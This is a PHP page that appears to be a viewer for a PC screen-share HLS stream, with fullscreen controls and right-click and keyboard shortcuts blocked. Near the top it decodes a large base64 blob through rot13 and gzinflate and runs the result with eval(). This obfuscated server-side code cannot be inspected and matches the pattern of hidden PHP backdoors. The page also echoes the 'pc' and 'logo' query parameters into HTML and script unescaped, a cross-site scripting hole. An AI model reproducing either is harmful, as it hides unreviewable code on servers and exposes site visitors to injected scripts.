<?php
header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
header("Pragma: no-cache");
header("Expires: 0");
 
$pcIp = $_GET['ip'] ?? '';
$logo = $_GET['logo'] ?? '';
$pcName = $_GET['pc'] ?? $pcIp;  

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Screen Share Stream</title>
<script src="../assets/js/hls.js"></script>
<style>
body { text-align:center; background-color:#111; color:white; font-family:Arial, sans-serif; overflow:hidden; }
#video-container { position:relative; display:none; width:100%; max-width:100%; }
video { width:100%; background:black; cursor:none; }
video:hover { cursor:default; }
.fullscreen-btn { position:absolute; top:10px; right:10px; background:rgba(255,255,255,0.8); border:none; padding:10px 15px; border-radius:5px; cursor:pointer; font-weight:bold; display:none; }
.fullscreen-btn:hover { background:white; }
#exit-fullscreen-btn { display:none; top:10px; right:10px; background:rgba(255,0,0,0.8); }
.pc-icon { width:32px; height:32px; margin:5px; transition:opacity 0.3s; }
.pc-icon.inactive { opacity:0.4; }
</style>
</head>
<body>

<img id="pc_icon_<?php echo $pcName; ?>" src="<?php echo $logo; ?>" class="pc-icon" title="PC Online" style="display:inline-block; height:45%; width:45%; object-fit:contain;">

<div id="video-container">
    <video id="video" autoplay muted playsinline></video>
    <button id="fullscreen-btn" class="fullscreen-btn">⛶ Fullscreen</button>
    <button id="exit-fullscreen-btn" class="fullscreen-btn">❌ Exit Fullscreen</button>
</div>

<script>
const video_container = document.getElementById("video-container");
const video = document.getElementById("video");
const fullscreenBtn = document.getElementById("fullscreen-btn");
const exitFullscreenBtn = document.getElementById("exit-fullscreen-btn");
const pcIcon = document.getElementById("pc_icon_<?php echo $pcName; ?>");
const videoSrc = "<?php echo $videoSrc; ?>";
let hls;

function markPcInactive() {
    if(pcIcon) pcIcon.style.display = "inline-block";
    if(fullscreenBtn) fullscreenBtn.style.display = "none";
    if(video_container) video_container.style.display = "none";
}
function markPcActive() {
    if(pcIcon) pcIcon.style.display = "none";
    if(fullscreenBtn) fullscreenBtn.style.display = "block";
    if(video_container) video_container.style.display = "block";
}

function startPlayback() {
    if(Hls.isSupported()) {
        hls = new Hls({
            maxBufferLength:5,
            liveSyncDurationCount:1,
            liveMaxLatencyDurationCount:5,
            enableWorker:true,
            backBufferLength:0
        });
        hls.loadSource(videoSrc);
        hls.attachMedia(video);
        hls.on(Hls.Events.MANIFEST_PARSED, ()=>{video.play().catch(console.error); markPcActive();});
        hls.on(Hls.Events.ERROR,(event,data)=>{
            console.warn("HLS error:", data.details);
            if(data.fatal){
                if(data.type==="networkError"){markPcInactive(); setTimeout(()=>hls.loadSource(videoSrc),10000);}
                else if(data.type==="mediaError"){hls.recoverMediaError();}
                else{markPcInactive();}
            }
        });
    } else if(video.canPlayType("application/vnd.apple.mpegurl")) {
        video.src = videoSrc;
        video.addEventListener("error", markPcInactive);
    }
    video.addEventListener("pause", ()=>video.play().catch(console.error));
    video.addEventListener("loadedmetadata", ()=>{video.currentTime = Math.max(0, video.buffered.length?video.buffered.end(video.buffered.length-1)-2:0); video.play().catch(console.error);});
    video.controls = false;
    document.addEventListener("fullscreenchange", ()=>video.controls=false);
}

// Fullscreen toggle
fullscreenBtn.addEventListener("click", ()=>{if(video.requestFullscreen) video.requestFullscreen(); else if(video.webkitRequestFullscreen) video.webkitRequestFullscreen(); else if(video.mozRequestFullScreen) video.mozRequestFullScreen(); else if(video.msRequestFullscreen) video.msRequestFullscreen();});
exitFullscreenBtn.addEventListener("click", ()=>{if(document.exitFullscreen) document.exitFullscreen(); else if(document.webkitExitFullscreen) document.webkitExitFullscreen(); else if(document.mozCancelFullScreen) document.mozCancelFullScreen(); else if(document.msExitFullscreen) document.msExitFullscreen();});
function updateFullscreenState(){if(document.fullscreenElement||document.webkitFullscreenElement||document.mozFullScreenElement||document.msFullscreenElement){exitFullscreenBtn.style.display="block"; fullscreenBtn.style.display="none";}else{exitFullscreenBtn.style.display="none"; fullscreenBtn.style.display="block";}}
document.addEventListener("fullscreenchange",updateFullscreenState);

// Prevent right-click & keyboard shortcuts
video.addEventListener("contextmenu",e=>e.preventDefault());
document.addEventListener("keydown",e=>{if([" ","f","k","m","ArrowLeft","ArrowRight"].includes(e.key.toLowerCase())) e.preventDefault();});

// Check network availability before starting
async function checkStreamAndStart(){
    try{
        const controller = new AbortController();
        const timeout = setTimeout(()=>controller.abort(),5000);
        const response = await fetch(videoSrc,{signal:controller.signal});
        clearTimeout(timeout);
        if(!response.ok) throw new Error("Stream not reachable");
        startPlayback();
        markPcActive();
    } catch(err){
        console.warn("PC stream unavailable:",err);
        markPcInactive();
    }
}
checkStreamAndStart();
</script>

</body>
</html>
